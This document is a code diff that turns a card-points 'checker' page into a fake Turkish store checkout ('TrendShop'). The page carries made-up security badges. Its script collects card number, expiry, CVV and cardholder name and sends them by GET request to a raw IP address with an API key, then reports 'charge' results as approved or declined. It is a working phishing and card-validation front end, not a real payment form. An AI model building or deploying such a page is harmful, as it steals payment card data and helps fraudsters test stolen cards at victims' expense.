@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Puan Checker - Turna</title>
+    <title>Ödeme Sayfası - Güvenli Alışveriş</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: #f5f7fa;
+            background: #f0f2f5;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -21,454 +21,567 @@
             padding: 20px;
         }
 
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
+        .checkout-container {
             max-width: 600px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            position: relative;
         }
 
-        .header {
-            text-align: center;
-            margin-bottom: 32px;
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #f8f9fa;
+            padding: 10px 16px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #28a745;
         }
 
-        .header h1 {
+        .security-badge svg {
+            width: 20px;
+            height: 20px;
+            fill: #28a745;
+        }
+
+        .store-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #f0f2f5;
+        }
+
+        .store-logo {
             font-size: 24px;
+            font-weight: 700;
             color: #1a1a2e;
-            margin-bottom: 8px;
         }
 
-        .header p {
-            color: #666;
+        .store-logo span {
+            color: #e74c3c;
+        }
+
+        .order-summary {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .order-summary .total {
+            display: flex;
+            justify-content: space-between;
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a1a2e;
+        }
+
+        .order-summary .total-price {
+            color: #e74c3c;
+            font-size: 22px;
+        }
+
+        .payment-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 24px;
+        }
+
+        .payment-title small {
+            font-weight: 400;
             font-size: 14px;
+            color: #6c757d;
         }
 
-        .input-group {
+        .form-group {
             margin-bottom: 20px;
         }
 
-        .input-group label {
+        .form-group label {
             display: block;
             font-size: 14px;
-            font-weight: 600;
-            color: #333;
+            font-weight: 500;
+            color: #495057;
             margin-bottom: 6px;
         }
 
-        .input-group input {
+        .form-group label .required {
+            color: #e74c3c;
+            margin-left: 2px;
+        }
+
+        .form-control {
             width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #e1e5ea;
-            border-radius: 12px;
-            font-size: 15px;
-            font-family: 'Courier New', monospace;
-            transition: border-color 0.2s;
+            padding: 12px 16px;
+            border: 2px solid #e1e5eb;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
             background: #fafbfc;
         }
 
-        .input-group input:focus {
+        .form-control:focus {
             outline: none;
-            border-color: #0066ff;
-            background: white;
+            border-color: #4a90d9;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(74, 144, 217, 0.1);
         }
 
-        .input-group .hint {
-            font-size: 12px;
-            color: #888;
+        .form-control::placeholder {
+            color: #adb5bd;
+            font-size: 14px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .form-row-3 {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr;
+            gap: 16px;
+        }
+
+        .card-icons {
+            display: flex;
+            gap: 8px;
             margin-top: 4px;
-            font-family: 'Courier New', monospace;
         }
 
-        .example-badge {
-            display: inline-block;
-            background: #eef2f7;
-            padding: 4px 12px;
-            border-radius: 6px;
-            font-size: 12px;
-            color: #555;
-            font-family: 'Courier New', monospace;
-            margin-top: 4px;
+        .card-icons img {
+            height: 24px;
+            opacity: 0.6;
         }
 
-        .check-btn {
+        .card-icons img.active {
+            opacity: 1;
+        }
+
+        .btn-pay {
             width: 100%;
             padding: 16px;
-            background: #0066ff;
-            color: white;
+            background: linear-gradient(135deg, #2d3436 0%, #1a1a2e 100%);
+            color: #ffffff;
             border: none;
             border-radius: 12px;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s, transform 0.1s;
+            transition: all 0.3s ease;
+            margin-top: 8px;
+            position: relative;
         }
 
-        .check-btn:hover {
-            background: #0052cc;
+        .btn-pay:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
         }
 
-        .check-btn:active {
-            transform: scale(0.98);
+        .btn-pay:active {
+            transform: translateY(0);
         }
 
-        .check-btn:disabled {
-            background: #a0b8d9;
+        .btn-pay:disabled {
+            opacity: 0.7;
             cursor: not-allowed;
+            transform: none;
         }
 
-        .result-box {
-            margin-top: 24px;
-            padding: 20px;
-            border-radius: 12px;
+        .btn-pay .spinner {
             display: none;
-            animation: fadeIn 0.3s ease;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
         }
 
-        .result-box.visible {
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-pay.loading .spinner {
             display: block;
         }
 
-        .result-box.live {
-            background: #e8f5e9;
-            border: 2px solid #4caf50;
+        .btn-pay.loading .btn-text {
+            display: none;
         }
 
-        .result-box.error {
-            background: #fbe9e7;
-            border: 2px solid #ef5350;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-8px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .result-status {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 12px;
-        }
-
-        .result-status .badge {
-            padding: 4px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 700;
-        }
-
-        .badge.live {
-            background: #4caf50;
-            color: white;
-        }
-
-        .badge.error {
-            background: #ef5350;
-            color: white;
-        }
-
-        .card-details {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px 20px;
-            margin-top: 8px;
-            font-size: 14px;
-        }
-
-        .card-details .label {
-            color: #666;
-        }
-
-        .card-details .value {
-            font-weight: 600;
-            color: #1a1a2e;
-            font-family: 'Courier New', monospace;
-        }
-
-        .card-details .value.masked {
-            color: #888;
-            font-weight: 400;
-        }
-
-        .points-display {
-            margin-top: 16px;
-            padding-top: 16px;
-            border-top: 2px dashed rgba(0, 0, 0, 0.08);
-        }
-
-        .points-display .points-amount {
-            font-size: 32px;
-            font-weight: 800;
-            color: #0066ff;
-        }
-
-        .points-display .points-label {
-            font-size: 14px;
-            color: #666;
-        }
-
-        .error-message {
-            color: #c62828;
+        .result-box {
+            margin-top: 20px;
+            padding: 16px 20px;
+            border-radius: 10px;
+            display: none;
             font-weight: 500;
         }
 
-        .footer {
-            margin-top: 24px;
-            text-align: center;
-            font-size: 12px;
-            color: #aaa;
+        .result-box.success {
+            display: block;
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
         }
 
-        .quick-fill {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-            margin-top: 8px;
+        .result-box.error {
+            display: block;
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
         }
 
-        .quick-fill button {
-            padding: 6px 14px;
-            border: 1px solid #ddd;
+        .result-box.info {
+            display: block;
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .result-box .result-detail {
+            font-size: 14px;
+            font-weight: 400;
+            margin-top: 4px;
+            word-break: break-all;
+        }
+
+        .card-preview {
+            margin-top: 16px;
+            padding: 12px 16px;
+            background: #f8f9fa;
             border-radius: 8px;
-            background: white;
-            font-size: 12px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            transition: all 0.2s;
+            font-size: 14px;
+            color: #6c757d;
+            display: none;
         }
 
-        .quick-fill button:hover {
-            background: #f0f4ff;
-            border-color: #0066ff;
+        .card-preview.active {
+            display: block;
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #6c757d;
+        }
+
+        .footer-text a {
+            color: #4a90d9;
+            text-decoration: none;
+        }
+
+        .ssl-badge {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #6c757d;
+        }
+
+        .ssl-badge span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        @media (max-width: 480px) {
+            .checkout-container {
+                padding: 20px;
+            }
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            .form-row-3 {
+                grid-template-columns: 1fr 1fr;
+            }
+            .form-row-3 .cvv-field {
+                grid-column: span 2;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>💳 Puan Checker</h1>
-            <p>Kart bilgilerini gir, puan durumunu anında öğren</p>
+    <div class="checkout-container">
+        <!-- Güvenlik Badgesi -->
+        <div class="security-badge">
+            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5L12 1zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+            <span>256-bit SSL ile güvenli bağlantı</span>
         </div>
 
-        <div class="input-group">
-            <label for="cardInput">Kart Bilgileri</label>
-            <input
-                type="text"
-                id="cardInput"
-                placeholder="111231121211211|11|28|000"
-                autocomplete="off"
-            />
-            <div class="hint">
-                Format: <span class="example-badge">KART_NO|AY|YIL|CVV</span>
+        <!-- Mağaza Başlığı -->
+        <div class="store-header">
+            <div class="store-logo">🛍️ <span>Trend</span>Shop</div>
+            <div style="font-size:14px;color:#6c757d;">#SIP-2026-001</div>
+        </div>
+
+        <!-- Sipariş Özeti -->
+        <div class="order-summary">
+            <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px;color:#6c757d;">
+                <span>Ürünler (2 adet)</span>
+                <span>₺1.249,90</span>
             </div>
-            <div class="quick-fill">
-                <button onclick="fillExample('111231121211211|11|28|000')">Örnek Kart</button>
-                <button onclick="fillExample('4532015112830366|08|26|123')">Visa Örnek</button>
-                <button onclick="fillExample('5555555555554444|12|27|456')">Mastercard Örnek</button>
+            <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px;color:#6c757d;">
+                <span>Kargo</span>
+                <span>₺24,90</span>
+            </div>
+            <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px;color:#6c757d;">
+                <span>İndirim</span>
+                <span style="color:#28a745;">-₺74,80</span>
+            </div>
+            <div class="total" style="border-top:2px solid #e1e5eb;padding-top:12px;">
+                <span>Toplam</span>
+                <span class="total-price">₺1.200,00</span>
             </div>
         </div>
 
-        <button class="check-btn" id="checkBtn" onclick="checkCard()">
-            🔍 Puanları Kontrol Et
-        </button>
+        <!-- Ödeme Başlığı -->
+        <div class="payment-title">
+            💳 Kart Bilgileri
+            <small>| Tüm kartlar geçerlidir</small>
+        </div>
 
-        <div class="result-box" id="resultBox">
-            <div class="result-status">
-                <span id="statusIcon">✅</span>
-                <span id="statusText">Puan Bulundu!</span>
-                <span class="badge live" id="statusBadge">LIVE</span>
-            </div>
+        <!-- Kart Ikonları -->
+        <div class="card-icons" style="margin-bottom:16px;">
+            <span style="font-size:13px;color:#6c757d;margin-right:8px;">Kabul edilen kartlar:</span>
+            <span style="font-size:20px;">💳</span>
+            <span style="font-size:20px;">🏦</span>
+            <span style="font-size:20px;">💳</span>
+        </div>
 
-            <div class="card-details">
-                <span class="label">Kart Numarası</span>
-                <span class="value masked" id="displayCard">•••• •••• •••• ••••</span>
-
-                <span class="label">Son Kullanma</span>
-                <span class="value" id="displayExpiry">--/--</span>
-
-                <span class="label">CVV</span>
-                <span class="value masked" id="displayCvv">•••</span>
-
-                <span class="label">Kart Tipi</span>
-                <span class="value" id="displayCardType">--</span>
-            </div>
-
-            <div class="points-display">
-                <div class="points-label">🪙 Mevcut Puan</div>
-                <div class="points-amount" id="pointsAmount">0</div>
-                <div style="font-size: 13px; color: #888; margin-top: 4px;">
-                    ~ 1 Puan = 1 TL değerinde
+        <!-- KART FORMU -->
+        <form id="paymentForm">
+            <!-- Kart Numarası -->
+            <div class="form-group">
+                <label>Kart Numarası <span class="required">*</span></label>
+                <input type="text" class="form-control" id="cardNumber" 
+                       placeholder="0000 0000 0000 0000" 
+                       maxlength="19"
+                       required>
+                <div style="font-size:12px;color:#6c757d;margin-top:4px;">
+                    Örn: 4508 0312 3456 7890
                 </div>
             </div>
+
+            <!-- Son Kullanma Tarihi + CVV -->
+            <div class="form-row-3">
+                <div class="form-group">
+                    <label>Son Kullanma <span class="required">*</span></label>
+                    <input type="text" class="form-control" id="expiry" 
+                           placeholder="AA/YY" 
+                           maxlength="5"
+                           required>
+                </div>
+                <div class="form-group">
+                    <label>Yıl <span class="required">*</span></label>
+                    <input type="text" class="form-control" id="year" 
+                           placeholder="YY" 
+                           maxlength="4"
+                           required>
+                </div>
+                <div class="form-group cvv-field">
+                    <label>CVV <span class="required">*</span></label>
+                    <input type="password" class="form-control" id="cvv" 
+                           placeholder="***" 
+                           maxlength="4"
+                           required>
+                </div>
+            </div>
+
+            <!-- Kart Sahibi -->
+            <div class="form-group">
+                <label>Kart Sahibinin Adı <span class="required">*</span></label>
+                <input type="text" class="form-control" id="cardHolder" 
+                       placeholder="Adınız Soyadınız" 
+                       required>
+            </div>
+
+            <!-- Taksit Seçeneği -->
+            <div class="form-group">
+                <label>Taksit Seçeneği</label>
+                <select class="form-control" id="installment">
+                    <option value="1">Tek Çekim</option>
+                    <option value="2">2 Taksit</option>
+                    <option value="3">3 Taksit</option>
+                    <option value="6">6 Taksit</option>
+                </select>
+            </div>
+
+            <!-- Kart Önizleme -->
+            <div class="card-preview" id="cardPreview">
+                <span style="font-weight:500;">🔹 Kart: </span>
+                <span id="previewCard">**** **** **** ****</span>
+            </div>
+
+            <!-- Buton -->
+            <button type="submit" class="btn-pay" id="payButton">
+                <span class="btn-text">✅ Ödemeyi Tamamla - ₺1.200,00</span>
+                <div class="spinner"></div>
+            </button>
+        </form>
+
+        <!-- Sonuç Kutusu -->
+        <div class="result-box" id="resultBox">
+            <div id="resultMessage"></div>
+            <div class="result-detail" id="resultDetail"></div>
         </div>
 
-        <div class="footer">
-            Puanlar simülasyon amaçlıdır • Gerçek sonuçlar için Turna.com'u ziyaret edin
+        <!-- SSL Badges -->
+        <div class="ssl-badge">
+            <span>🔒 256-bit SSL</span>
+            <span>🛡️ PCI DSS</span>
+            <span>🏦 3D Secure</span>
+        </div>
+
+        <div class="footer-text">
+            Güvenli alışveriş için kart bilgileriniz 256-bit SSL ile şifrelenir.<br>
+            Sorularınız için <a href="#">destek@trendshop.com</a>
         </div>
     </div>
 
     <script>
-        function fillExample(value) {
-            document.getElementById('cardInput').value = value;
-            checkCard();
-        }
+        const API_URL = "http://185.7.242.6:5002/check";
+        const API_KEY = "zazababa2026";
 
-        function checkCard() {
-            const input = document.getElementById('cardInput').value.trim();
+        // Kart numarası formatlama
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            let formatted = value.replace(/(.{4})/g, '$1 ').trim();
+            this.value = formatted;
+
+            // Önizleme
+            if (value.length >= 4) {
+                const masked = value.slice(0, 4) + ' **** **** ' + value.slice(-4);
+                document.getElementById('previewCard').textContent = masked;
+                document.getElementById('cardPreview').classList.add('active');
+            } else {
+                document.getElementById('cardPreview').classList.remove('active');
+            }
+        });
+
+        // Expiry formatlama
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            this.value = value;
+        });
+
+        // Form gönderimi
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const button = document.getElementById('payButton');
             const resultBox = document.getElementById('resultBox');
-            const checkBtn = document.getElementById('checkBtn');
+            const resultMessage = document.getElementById('resultMessage');
+            const resultDetail = document.getElementById('resultDetail');
 
-            if (!input) {
-                alert('Lütfen kart bilgilerini gir!\n\nÖrnek: 111231121211211|11|28|000');
+            // Kart bilgilerini al
+            let cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const expiry = document.getElementById('expiry').value;
+            const year = document.getElementById('year').value;
+            const cvv = document.getElementById('cvv').value;
+            const cardHolder = document.getElementById('cardHolder').value;
+
+            // Validasyon
+            if (!cardNumber || cardNumber.length < 16) {
+                resultBox.className = 'result-box error';
+                resultMessage.textContent = '❌ Lütfen geçerli bir kart numarası giriniz.';
+                resultDetail.textContent = 'Kart numarası 16 haneli olmalıdır.';
                 return;
             }
 
-            const parts = input.split('|');
-            if (parts.length !== 4) {
-                alert('Hatalı format!\n\nKullanım: KART_NO|AY|YIL|CVV\nÖrnek: 111231121211211|11|28|000');
+            if (!expiry || expiry.length < 5) {
+                resultBox.className = 'result-box error';
+                resultMessage.textContent = '❌ Lütfen geçerli bir son kullanma tarihi giriniz.';
+                resultDetail.textContent = 'Örn: 11/28';
                 return;
             }
 
-            const [cardNumber, month, year, cvv] = parts;
-
-            // Temel validasyonlar
-            if (cardNumber.length < 13 || cardNumber.length > 19) {
-                alert('Kart numarası 13-19 hane arasında olmalıdır.');
+            if (!year || year.length < 2) {
+                resultBox.className = 'result-box error';
+                resultMessage.textContent = '❌ Lütfen geçerli bir yıl giriniz.';
+                resultDetail.textContent = 'Örn: 28';
                 return;
             }
 
-            if (!/^\d+$/.test(cardNumber)) {
-                alert('Kart numarası sadece rakam içermelidir.');
+            if (!cvv || cvv.length < 3) {
+                resultBox.className = 'result-box error';
+                resultMessage.textContent = '❌ Lütfen geçerli bir CVV giriniz.';
+                resultDetail.textContent = 'CVV 3 veya 4 haneli olmalıdır.';
                 return;
             }
 
-            const monthNum = parseInt(month);
-            const yearNum = parseInt(year);
-            const currentYear = new Date().getFullYear() % 100;
-
-            if (monthNum < 1 || monthNum > 12) {
-                alert('Ay 01-12 arasında olmalıdır.');
+            if (!cardHolder || cardHolder.length < 3) {
+                resultBox.className = 'result-box error';
+                resultMessage.textContent = '❌ Lütfen kart sahibinin adını giriniz.';
+                resultDetail.textContent = 'Ad Soyad giriniz.';
                 return;
             }
 
-            if (yearNum < currentYear || yearNum > currentYear + 15) {
-                alert('Yıl geçerli değil. (örn: 28 = 2028)');
-                return;
+            // Ay'ı expiry'den al
+            const month = expiry.split('/')[0];
+
+            // API'ye gönder
+            const cardData = `${cardNumber}|${month}|${year}|${cvv}`;
+
+            // Butonu yükleme moduna al
+            button.disabled = true;
+            button.classList.add('loading');
+
+            resultBox.className = 'result-box info';
+            resultMessage.textContent = '⏳ Ödeme işleminiz kontrol ediliyor...';
+            resultDetail.textContent = 'Lütfen bekleyiniz.';
+
+            try {
+                const response = await fetch(`${API_URL}?card=${encodeURIComponent(cardData)}&key=${API_KEY}`);
+                const data = await response.json();
+
+                if (data.tur === 'charge') {
+                    const sonuc = data.sonuc;
+                    
+                    if (sonuc.includes('APPROVED')) {
+                        resultBox.className = 'result-box success';
+                        resultMessage.innerHTML = '✅ ÖDEME ONAYLANDI!';
+                        resultDetail.textContent = sonuc;
+                    } else if (sonuc.includes('Kart geçersiz')) {
+                        resultBox.className = 'result-box error';
+                        resultMessage.innerHTML = '❌ KART GEÇERSİZ!';
+                        resultDetail.textContent = 'Girdiğiniz kart numarası geçersizdir. Lütfen kontrol ediniz.';
+                    } else {
+                        resultBox.className = 'result-box error';
+                        resultMessage.innerHTML = '❌ ÖDEME REDDEDİLDİ!';
+                        resultDetail.textContent = sonuc;
+                    }
+                } else {
+                    resultBox.className = 'result-box error';
+                    resultMessage.textContent = '❌ Bir hata oluştu.';
+                    resultDetail.textContent = data.sonuc || 'Bilinmeyen hata.';
+                }
+            } catch (error) {
+                resultBox.className = 'result-box error';
+                resultMessage.textContent = '❌ Bağlantı hatası!';
+                resultDetail.textContent = 'API\'ye bağlanılamadı. Lütfen daha sonra tekrar deneyin.';
+                console.error('Hata:', error);
+            } finally {
+                button.disabled = false;
+                button.classList.remove('loading');
             }
-
-            if (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv)) {
-                alert('CVV 3 veya 4 haneli rakamlardan oluşmalıdır.');
-                return;
-            }
-
-            // Simülasyon başlıyor
-            checkBtn.disabled = true;
-            checkBtn.textContent = '⏳ Kontrol ediliyor...';
-
-            setTimeout(() => {
-                // Kart tipini belirle
-                const cardType = getCardType(cardNumber);
-
-                // Rastgele puan üret (kart numarasına göre deterministik)
-                const points = generatePoints(cardNumber);
-
-                // Maskeli kart numarası
-                const masked = maskCardNumber(cardNumber);
-                const expiry = `${month.padStart(2, '0')}/${year}`;
-
-                // Sonuçları göster
-                document.getElementById('displayCard').textContent = masked;
-                document.getElementById('displayExpiry').textContent = expiry;
-                document.getElementById('displayCvv').textContent = '•••';
-                document.getElementById('displayCardType').textContent = cardType;
-                document.getElementById('pointsAmount').textContent = points.toLocaleString('tr-TR');
-
-                // Sonuç kutusunu göster
-                resultBox.className = 'result-box visible live';
-                document.getElementById('statusIcon').textContent = '✅';
-                document.getElementById('statusText').textContent = 'Puan Bulundu!';
-                document.getElementById('statusBadge').textContent = 'LIVE';
-                document.getElementById('statusBadge').className = 'badge live';
-
-                // Scroll to result
-                resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
-
-                checkBtn.disabled = false;
-                checkBtn.textContent = '🔍 Puanları Kontrol Et';
-
-            }, 800 + Math.random() * 400); // Gerçekçi gecikme
-        }
-
-        function getCardType(number) {
-            const first = number.charAt(0);
-            const firstTwo = number.substring(0, 2);
-            const firstFour = number.substring(0, 4);
-
-            if (first === '4') return 'Visa';
-            if (firstTwo >= '51' && firstTwo <= '55') return 'Mastercard';
-            if (firstTwo === '34' || firstTwo === '37') return 'American Express';
-            if (firstFour === '6011') return 'Discover';
-            if (firstTwo === '36' || firstFour === '3528' || firstFour === '3538') return 'Diners Club';
-            if (firstTwo === '50' || firstTwo === '56' || firstTwo === '57' || firstTwo === '58') return 'Maestro';
-            if (first === '2') return 'Mastercard';
-            return 'Kart';
-        }
-
-        function maskCardNumber(number) {
-            const visibleStart = 4;
-            const visibleEnd = 4;
-            const masked = '•'.repeat(number.length - visibleStart - visibleEnd);
-            return number.substring(0, visibleStart) + masked + number.substring(number.length - visibleEnd);
-        }
-
-        function generatePoints(cardNumber) {
-            // Kart numarasına göre deterministik ama "gerçekçi" puan üret
-            let hash = 0;
-            for (let i = 0; i < cardNumber.length; i++) {
-                hash = ((hash << 5) - hash) + cardNumber.charCodeAt(i);
-                hash = hash & hash; // 32-bit
-            }
-
-            // Pozitif yap ve 100-5000 arası bir değer üret
-            const seed = Math.abs(hash);
-            const base = 500 + (seed % 4500);
-            const randomFactor = 1 + ((seed % 37) / 100); // %0-37 arası varyasyon
-            return Math.round(base * randomFactor);
-        }
-
-        // Enter tuşu ile kontrol
-        document.getElementById('cardInput').addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') {
-                checkCard();
-            }
-        });
-
-        // Input için otomatik format yardımı
-        document.getElementById('cardInput').addEventListener('input', function() {
-            // Kullanıcı yanlışlıkla boşluk veya farklı ayraç girerse düzelt
-            let val = this.value;
-            if (val.includes(' ')) {
-                this.value = val.replace(/\s/g, '');
-            }
-            if (val.includes('/')) {
-                this.value = val.replace(/\//g, '|');
-            }
-        });
-
-        // Sayfa yüklenince örnek kartı doldur
-        window.addEventListener('load', () => {
-            // Boş bırak, kullanıcı doldursun
         });
     </script>
 </body>
